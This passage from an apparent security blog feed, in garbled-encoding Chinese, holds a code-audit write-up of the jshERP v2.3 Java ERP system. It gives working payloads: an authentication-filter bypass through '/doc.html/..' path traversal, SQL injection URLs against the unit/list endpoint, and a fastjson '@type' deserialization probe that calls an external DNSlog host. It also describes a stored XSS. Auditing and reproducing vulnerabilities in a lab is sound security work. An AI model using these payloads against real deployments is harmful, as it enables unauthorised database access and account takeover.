title="ä¸ƒã€æ€»ç»“"></a>ä¸ƒã€æ€»ç»“</h1><p>è¿™ä¸ªbluecmsæœ‰åšä¸»å…±è®¡74å¤„æ¼æ´ï¼Œæ›´å¤šçš„æ¼æ´å°±æš‚æ—¶ä¸çœ‹äº†ï¼Œè¿™é‡Œè´´ä¸Šè¿™ä½åšä¸»çš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_41924764/article/details/143192460">Bluecms 1.6 ä»£ç å®¡è®¡è¿‡ç¨‹ï¼ˆå…±è®¡ 74 ä¸ªæ¼æ´ï¼‰-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaä»£ç å®¡è®¡ã€‘åå¤-ERPv2.3</title>
      <link href="/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/"/>
      <url>/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1><p>1ã€ä¸‹è½½ï¼šä¸‹è½½åœ°å€ï¼ˆv2.3ç‰ˆæœ¬ï¼‰ï¼š<a href="https://github.com/jishenghua/jshERP/releases">Releases Â· jishenghua&#x2F;jshERP</a></p><p>2ã€å¯¼å…¥IDEAä¸­ï¼Œåœ¨è®¾ç½®ä¸­é…ç½®java ç¯å¢ƒä¸º1.8ï¼Œè¶Šä½è¶Šå¥½å§ï¼Œæˆ‘æ˜¯ç”¨çš„æ˜¯1.8.0_65</p><p>3ã€åœ¨MySQLæ•°æ®åº“æ–°å»º<code>jsh_erp</code>æ•°æ®åº“</p><p>4ã€å¯¼å…¥<code>docs/jsh_erp.sql</code>æ•°æ®æ–‡ä»¶</p><p>5ã€åœ¨<code>application.properties</code>é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹MySQLæ•°æ®åº“åœ°å€ç«¯å£å’Œè´¦å·å¯†ç </p><p>6ã€æ›´æ–°åŠ è½½<code>pom.xml</code>é…ç½®æ–‡ä»¶</p><p>7ã€è¿è¡Œ<code>ErpApplication.java</code>æ–‡ä»¶ï¼Œå¯åŠ¨é¡¹ç›®ã€‚å¯åŠ¨æˆåŠŸä¼šå‡ºç°è®¿é—®åœ°å€å’Œç«¯å£ï¼Œä»¥åŠè´¦å·çš„è´¦å·å¯†ç </p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020203428300.png" alt="image-20241020203428300"></p><h1 id="äºŒã€å®¡è®¡å‡†å¤‡"><a href="#äºŒã€å®¡è®¡å‡†å¤‡" class="headerlink" title="äºŒã€å®¡è®¡å‡†å¤‡"></a>äºŒã€å®¡è®¡å‡†å¤‡</h1><p>å…ˆå¤§è‡´æµè§ˆä¸‹æ•´ä¸ªé¡¹ç›®çš„å¤§è‡´ç»“æ„å’Œé…ç½®ä¿¡æ¯</p><h2 id="1ã€pom-xml-é…ç½®ä¿¡æ¯"><a href="#1ã€pom-xml-é…ç½®ä¿¡æ¯" class="headerlink" title="1ã€pom.xml é…ç½®ä¿¡æ¯"></a>1ã€pom.xml é…ç½®ä¿¡æ¯</h2><p>ä½¿ç”¨äº†1.2.55 ç‰ˆæœ¬çš„fastjsonï¼Œå…·å¤‡fastjson ååºåˆ—åŒ–çš„ç‰ˆæœ¬è¦æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.2.55&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–è¿˜æ˜¯ç”¨äº†2.10.0 ç‰ˆæœ¬çš„log4j</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;2.10.0&lt;/version&gt;</span><br><span class="line">&lt;scope&gt;compile&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™ä¸ªç‰ˆæœ¬æ˜¯ä¸å­˜åœ¨æ¼æ´çš„ï¼Œå¯ä»¥å»maven çš„å®˜ç½‘æŸ¥çœ‹</p><p>æ•°æ®åº“ä½¿ç”¨äº†MyBatis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.gitee.starblues&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;springboot-plugin-framework-extension-mybatis&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;2.2.1-RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="2ã€filter-é…ç½®"><a href="#2ã€filter-é…ç½®" class="headerlink" title="2ã€filter é…ç½®"></a>2ã€filter é…ç½®</h2><p><strong>å…ˆçœ‹ doFilter å‡½æ•°å†…å®¹</strong></p><p>1ã€ä»sessionä¸­æå–user å‚æ•°çš„å€¼ï¼Œå¦‚æœä¸ä¸ºnullï¼Œåˆ™è·³è¿‡è®¤è¯ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰é—®é¢˜çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//å…·ä½“ï¼Œæ¯”å¦‚ï¼šå¤„ç†è‹¥ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ</span><br><span class="line">Object userInfo = servletRequest.getSession().getAttribute(&quot;user&quot;);</span><br><span class="line">if(userInfo!=null) &#123; //å¦‚æœå·²ç™»å½•ï¼Œä¸é˜»æ­¢</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€å¦‚æœè®¿é—®çš„url ä¸­åŒ…å« <code>/doc.html</code>ã€<code>/register.html</code>ã€<code>/login.html</code>ï¼Œè¿™äº›å­—ç¬¦ä¸²ï¼Œåˆ™ä¸è¿›è¡Œè®¤è¯ã€‚</p><p>è¿™æ ·å…¶å®æ˜¯ä¸ä¸¥æ ¼çš„ï¼Œå¦‚æœurl é•¿è¿™æ ·å‘¢ï¼š<code>/doc.html/../home.html</code>ï¼Œæ€•ä¼šå‡ºç°æœªæˆæƒè®¿é—®é˜¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (requestUrl != null &amp;&amp; (requestUrl.contains(&quot;/doc.html&quot;) ||</span><br><span class="line">    requestUrl.contains(&quot;/register.html&quot;) || requestUrl.contains(&quot;/login.html&quot;))) &#123;</span><br><span class="line">    chain.doFilter(request, response);  // è¯·æ±‚ä»¥ä¸ŠURLï¼Œå‡ä¸é˜»æ­¢</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3ã€ç¬¬ä¸‰éƒ¨åˆ†å°‘æœ‰ç‚¹ç»•ï¼Œæ€»ç»“å¦‚ä¸‹ï¼š</p><p>è®¿é—®<code>.cssã€.jsã€.jpgã€.pngã€.gifã€.icoã€/user/loginã€/user/registerUserã€/v2/api-docs</code>è¿™äº›å†…å®¹çš„æ—¶å€™ä¹Ÿä¸éœ€è¦è®¤è¯ã€‚åŒæ ·ä¸ä¸¥æ ¼ï¼Œå¦‚ï¼š<code>.css/../home.html</code>ï¼ŒåŒæ ·å­˜åœ¨æœªæˆæƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (verify(ignoredList, requestUrl)) &#123;</span><br><span class="line">    chain.doFilter(servletRequest, response);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">if (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) &#123;</span><br><span class="line">    for (String url : allowUrls) &#123;</span><br><span class="line">        if (requestUrl.startsWith(url)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4ã€æœ€åå¦‚æœç”¨æˆ·æ²¡æœ‰æƒé™ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servletResponse.sendRedirect(&quot;/login.html&quot;);</span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€SQLæ³¨å…¥æ¼æ´"><a href="#ä¸‰ã€SQLæ³¨å…¥æ¼æ´" class="headerlink" title="ä¸‰ã€SQLæ³¨å…¥æ¼æ´"></a>ä¸‰ã€SQLæ³¨å…¥æ¼æ´</h1><p>åœ¨<code>pom.xml</code>æ–‡ä»¶ä¸­çœ‹åˆ°ä½¿ç”¨çš„æ˜¯Mybatis ï¼Œæ‰€ä»¥æˆ‘ä»¬æŒ‰ç…§Mybatis çš„å®¡è®¡æ€è·¯æ¥</p><p>åœ¨<code>mapper</code>æ–‡ä»¶å¤¹ä¸‹æœç´¢<code>$</code>ç¬¦å·ï¼Œå°½é‡æŸ¥æ‰¾è·Ÿç”¨æˆ·æœ‰å…³çš„æ“ä½œ</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020210402987.png" alt="image-20241020210402987"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectByConditionUnit&quot; parameterType=&quot;com.jsh.erp.datasource.entities.UnitExample&quot; resultMap=&quot;com.jsh.erp.datasource.mappers.UnitMapper.BaseResultMap&quot;&gt;</span><br><span class="line">    select *</span><br><span class="line">    FROM jsh_unit</span><br><span class="line">    where 1=1</span><br><span class="line">    &lt;if test=&quot;name != null&quot;&gt;</span><br><span class="line">        and name like &#x27;%$&#123;name&#125;%&#x27;</span><br><span class="line">    &lt;/if&gt;</span><br><span class="line">    and ifnull(delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;</span><br><span class="line">    &lt;if test=&quot;offset != null and rows != null&quot;&gt;</span><br><span class="line">        limit #&#123;offset&#125;,#&#123;rows&#125;</span><br><span class="line">    &lt;/if&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>å›æº¯æœç´¢<code>selectByConditionUnit</code>ï¼Œåªæœ‰ä¸€ä¸ªæ¥å£å’Œä¸€ä¸ªç”¨æ³•</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020210849524.png" alt="image-20241020210849524"></p><p>æˆ‘ä»¬ä¸€è·¯å¾€ä¸Šæ‰¾ï¼Œè¿™é‡Œæ³¨æ„çœ‹ï¼Œä¸è¦è¢«è¿·æƒ‘ï¼Œï¼Œè½¬æ¢æˆäº†ç”±ä¼ é€’è¿‡æ¥çš„map æ§åˆ¶name çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public final static String SEARCH = &quot;search&quot;;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">private List&lt;?&gt; getUnitList(Map&lt;String, String&gt; map)throws Exception &#123;</span><br><span class="line">    String search = map.get(Constants.SEARCH);</span><br><span class="line">    String name = StringUtil.getInfo(search, &quot;name&quot;);</span><br><span class="line">    String order = QueryUtils.order(map);</span><br><span class="line">    return unitService.select(name, QueryUtils.offset(map), QueryUtils.rows(map));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¾€ä¸Šæ¥åˆ°è¿™é‡Œï¼Œå˜æˆäº†ä¸¤ä¸ªå‚æ•°æ§åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;</span><br><span class="line">    if (StringUtil.isNotEmpty(apiName)) &#123;</span><br><span class="line">        return container.getCommonQuery(apiName).select(parameterMap);</span><br><span class="line">    &#125;</span><br><span class="line">    return new ArrayList&lt;Object&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªselect åœ¨å¾€ä¸Šæ‰¾ï¼Œå°±æ¥åˆ°äº†æœ€åçš„controller å±‚</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020211910734.png" alt="image-20241020211910734"></p><p>æˆ‘ä»¬å…ˆåœ¨é¢ä¸´çš„é—®é¢˜æ˜¯apiNameæ˜¯ä»€ä¹ˆï¼Ÿå…·ä½“çš„é€»è¾‘åœ¨è¿™é‡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class InterfaceContainer &#123;</span><br><span class="line">    private final Map&lt;String, ICommonQuery&gt; configComponentMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    @Autowired(required = false)</span><br><span class="line">    private synchronized void init(ICommonQuery[] configComponents) &#123;</span><br><span class="line">        for (ICommonQuery configComponent : configComponents) &#123;</span><br><span class="line">            ResourceInfo info = AnnotationUtils.getAnnotation(configComponent, ResourceInfo.class);</span><br><span class="line">            if (info != null) &#123;</span><br><span class="line">                configComponentMap.put(info.value(), configComponent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public ICommonQuery getCommonQuery(String apiName) &#123;</span><br><span class="line">        return configComponentMap.get(apiName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>apiName</code>çš„å€¼ä¼šä»<code>configComponentMap</code>è¿™ä¸ªå˜é‡ä¸­è·å–ï¼Œè€Œè¿™ä¸ªå˜é‡åœ¨<code>init</code> å‡½æ•°ä¸­è¢«put å‹å…¥æ•°æ®ã€‚</p><p>å…·ä½“çš„å†…å®¹æ˜¯ï¼šserviceä¸‹æ¯ä¸ªæ–‡ä»¶å¤¹å¯¹åº”ä¸€ä¸ªapiName</p><p>æœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è·Ÿä¸€ä¸‹ï¼Œæœ¬äººç”±äºæ°´å¹³æœ‰é™ï¼Œè¿™é‡Œå°±ä¸è·Ÿäº†</p><p>è€Œæˆ‘ä»¬ä¸€å¼€å§‹å›æº¯æœç´¢çš„<code>selectByConditionUnit</code>å®ç°æ–¹æ³•å°±æ˜¯åœ¨<code>service\unit\UnitService.java</code>ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦çš„apiName çš„å€¼å°±æ˜¯unit</p><p>é‚£ä¹ˆæˆ‘ä»¬æ­£å‘æ€»ç»“ä¸€ä¸‹ï¼š</p><ol><li>è®¿é—®çš„æ¥å£åŸæœ¬æ˜¯ï¼š&#x2F;{apiName}&#x2F;list</li><li>è¿™é‡ŒapiName æ˜¯unit</li><li>éœ€è¦ä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ªï¼š<code>pageSize</code>ã€<code>currentPage</code>ã€<code>search</code></li><li>æˆ‘ä»¬ä¸»è¦çš„ç‚¹åœ¨searchè¿™é‡Œ</li></ol><p>ç»“åˆæœªæˆæƒè®¿é—® æ„é€ è¯·æ±‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/unit/list?pageSize=&amp;currentPage=&amp;search=jsh&#x27; and sleep(3)--+</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020215836900.png" alt="image-20241020215836900"></p><p>emmï¼Œå‡ºç°å¼‚å¸¸ï¼Œä¸”å¹¶æ²¡æœ‰å»¶è¿Ÿ3sï¼Œæ¥ç€å†æ¬¡æ‹ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼Œé—®é¢˜å‡ºç°åœ¨å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private List&lt;?&gt; getUnitList(Map&lt;String, String&gt; map)throws Exception &#123;</span><br><span class="line">    String search = map.get(Constants.SEARCH);  // Constants.SEARCH å°±æ˜¯search</span><br><span class="line">    String name = StringUtil.getInfo(search, &quot;name&quot;);// é€šè¿‡StringUtil.getInfo è·å–nameå€¼</span><br><span class="line">    String order = QueryUtils.order(map);</span><br><span class="line">    return unitService.select(name, QueryUtils.offset(map), QueryUtils.rows(map));  // QueryUtils.offset(map) éœ€è¦æˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å‚æ•°æœ‰å…·ä½“çš„å€¼ï¼Œä¸”æ˜¯æ•°å­—</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£è¿™ä¸ªnameå€¼è·å–è¿‡ç¨‹åˆ°åº•æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static String getInfo(String search, String key)&#123;</span><br><span class="line">    String value = &quot;&quot;;</span><br><span class="line">    if(search!=null) &#123;</span><br><span class="line">        JSONObject obj = JSONObject.parseObject(search);    // è§£ææˆjsonå¯¹è±¡ï¼ˆjsonååºåˆ—åŒ–ï¼‰</span><br><span class="line">        value = obj.getString(key);     // ç„¶åä»è§£æçš„jsonå¯¹è±¡ä¸­æ‹¿å‡ºæ¥name çš„å±æ€§å€¼</span><br><span class="line">        if(value.equals(&quot;&quot;)) &#123;</span><br><span class="line">            value = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¼ å…¥çš„search å‚æ•°å†…å®¹åº”è¯¥æ˜¯ä¸€ä¸ªjson å†…å®¹ï¼Œä¿®æ”¹payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/unit/list?search=/unit/list?search=%7B%22name%22%3A%22jsh%27%20or%201%3D1--%2B%22%7D&amp;pageSize=10&amp;currentPage=1&amp;pageSize=10&amp;currentPage=1</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020222906819.png" alt="image-20241020222906819"></p><p>å½“ç„¶è¿˜æœ‰æ›´å¤šçš„SQLæ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯æ•´ä½“æ€è·¯éƒ½å·®ä¸å¤š</p><h1 id="å››ã€æ°´å¹³è¶Šæƒæ¼æ´"><a href="#å››ã€æ°´å¹³è¶Šæƒæ¼æ´" class="headerlink" title="å››ã€æ°´å¹³è¶Šæƒæ¼æ´"></a>å››ã€æ°´å¹³è¶Šæƒæ¼æ´</h1><p>é‚£ä¹ˆä¼´éšçš„å°±æ˜¯æˆ‘ä»¬çš„è¶Šæƒæ¼æ´ï¼Œä¾ç„¶æ‹¿ä¸Šé¢è¿™ä¸ªSQLæ³¨å…¥æ¼æ´æ¥ä¸¾åˆ—å­</p><p>åœ¨ä¸Šæ–¹çš„SQLæ³¨å…¥æ¼”ç¤ºä¸­ ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡ç™»é™†è¿›å…¥åå°è®¿é—®æ¥å£é€ æˆçš„SQLæ³¨å…¥æ¼æ´ï¼Œå¦‚æœæˆ‘ä»¬ä¸ç™»é™†ï¼Œèƒ½å¦ä¾ç„¶è§¦å‘è¿™ä¸ªSQLæ³¨å…¥æ¼æ´å‘¢ï¼Ÿ</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020233203713.png" alt="image-20241020233203713"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬å»æ‰cookie çš„å†…å®¹ä¹‹åï¼Œæˆ‘ä»¬å°†é‡å®šå‘åˆ°ç™»å½•é¡µï¼Œè¿™æ˜¯æ­£å¸¸çš„é€»è¾‘ã€‚</p><p>ä½†å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸Šé¢filter åˆ†æå‡ºæ¥çš„æœªæˆæƒä¼šå¦‚ä½•å‘¢ï¼Ÿ</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020233339184.png" alt="image-20241020233339184"></p><p>ä¸”çœ‹ï¼Œæˆ‘ä»¬æ­¤æ—¶æ²¡æœ‰cookieå†…å®¹ï¼Œå³æ²¡æœ‰ç™»é™†çŠ¶æ€ï¼Œä¾ç„¶é€ æˆSQLæ³¨å…¥ï¼Œè®¿é—®å‡ºæ¥äº†æ•°æ®åº“ä¸­çš„æ•°æ®</p><p>é€ æˆè¿™ä¸€åˆ‡çš„â€œå¹•åé»‘æ‰‹â€å°±æ˜¯<code>/doc.html/..</code>ã€‚å› ä¸ºåœ¨filter  çš„é€»è¾‘ä¸­ï¼Œå¦‚æœURLä¸­åŒ…å«doc.html å†…å®¹ï¼Œå°±ä¸è¿›è¡Œè®¤è¯ï¼Œç›´æ¥æ”¾è¡Œ</p><p>è€Œè¿™ä¸ªè¶Šæƒé€ æˆçš„åæœå®åœ¨å¤ªå¤§äº†ï¼Œå¤§åˆ°å¯ä»¥ç›´æ¥æ‹¥æœ‰ç®¡ç†å‘˜çš„æƒé™ã€‚å¦‚ï¼šä¿®æ”¹å¯†ç ã€å¢åŠ ç”¨æˆ·ç­‰ã€‚</p><p>å…¶ä»–çš„è¶Šæƒç¤ºä¾‹ä¸å†å¤ç°ï¼ŒåŸç†ä¸€æ ·</p><h1 id="äº”ã€å­˜å‚¨å‹XSS"><a href="#äº”ã€å­˜å‚¨å‹XSS" class="headerlink" title="äº”ã€å­˜å‚¨å‹XSS"></a>äº”ã€å­˜å‚¨å‹XSS</h1><p>åœ¨å‰ç«¯html ç›®å½•ä¸­æœç´¢æœ‰å…³<code>/add</code> å¢åŠ çš„åŠŸèƒ½é¡µ</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232051877.png" alt="image-20241020232051877"></p><p>æœ‰ä¸€ä¸ªå¢åŠ ç”¨æˆ·çš„åŠŸèƒ½ç‚¹ï¼Œå…ˆå¢åŠ ä¸€ä¸ªç”¨æˆ·</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232746305.png" alt="image-20241020232746305"></p><p>ç„¶åä¿®æ”¹ç”¨æˆ·å</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232843671.png" alt="image-20241020232843671"></p><p>æˆåŠŸå¼¹æ¡†</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232854381.png" alt="image-20241020232854381"></p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232859791.png" alt="image-20241020232859791"></p><p>ä¸ºä»€ä¹ˆå…ˆå¢åŠ å†ä¿®æ”¹ï¼Œè€Œä¸æ˜¯ç›´æ¥å¢åŠ å°±æ·»åŠ payloadå‘¢ï¼Ÿå¢åŠ çš„æ—¶å€™é™åˆ¶è¾ƒå¤šï¼Œä¸å¦‚å…ˆå¢åŠ å†ä¿®æ”¹</p><p>ä½†æœ‰ä¸€ä¸ªå‰ææ˜¯æ‹¥æœ‰ç™»é™†åå°çš„é«˜æƒé™</p><h1 id="å…­ã€Fastjson-ååºåˆ—åŒ–æ¼æ´"><a href="#å…­ã€Fastjson-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="å…­ã€Fastjson ååºåˆ—åŒ–æ¼æ´"></a>å…­ã€Fastjson ååºåˆ—åŒ–æ¼æ´</h1><p>ä¹‹å‰çœ‹ <code>pom.xml</code> é…ç½®æ–‡ä»¶çš„æ—¶å€™å°±å‘ç° é¡¹ç›®ä½¿ç”¨çš„1.2.55 ç‰ˆæœ¬çš„fastjson çš„æ¼æ´ï¼Œé«˜ä½å¾—æ•´ä»–ä¸¤ä¸‹</p><p>æˆ‘ä»¬å…ˆæ‰‹å·¥æµ‹è¯•éœ€è¦å¼€å¯AutoType çš„æ–¹æ³•ï¼Œåœ¨SQLæ³¨å…¥çš„æ—¶å€™å°±å‘ç°ä¸€å¤„fastjson ååºåˆ—åŒ–ï¼Œåœ¨è¿™é‡Œå¼€å¯AutoType</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static String getInfo(String search, String key)&#123;</span><br><span class="line">    String value = &quot;&quot;;</span><br><span class="line">    if(search!=null) &#123;</span><br><span class="line">        JSONObject obj = JSONObject.parseObject(search);    // è§£ææˆjsonå¯¹è±¡ï¼ˆjsonååºåˆ—åŒ–ï¼‰</span><br><span class="line">        value = obj.getString(key);     // ç„¶åä»è§£æçš„jsonå¯¹è±¡ä¸­æ‹¿å‡ºæ¥name çš„å±æ€§å€¼</span><br><span class="line">        if(value.equals(&quot;&quot;)) &#123;</span><br><span class="line">            value = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±é¡ºç€SQLæ³¨å…¥çš„é“¾å­æ¥åˆ°è¿™é‡Œï¼Œè¿™ä¸ªsearch æ­£å¥½æ˜¯æˆ‘ä»¬è¿›è¡ŒSQLæ³¨å…¥ä¼ é€’çš„json æ ¼å¼</p><p>ä¿®æ”¹æˆ‘ä»¬SQLæ³¨å…¥çš„payload ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;3.b3925eed5a.ipv6.1433.eu.org&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020235518738.png" alt="image-20241020235518738"></p><p>ç›´æ¥æœªæˆæƒæ‰“å…¥</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
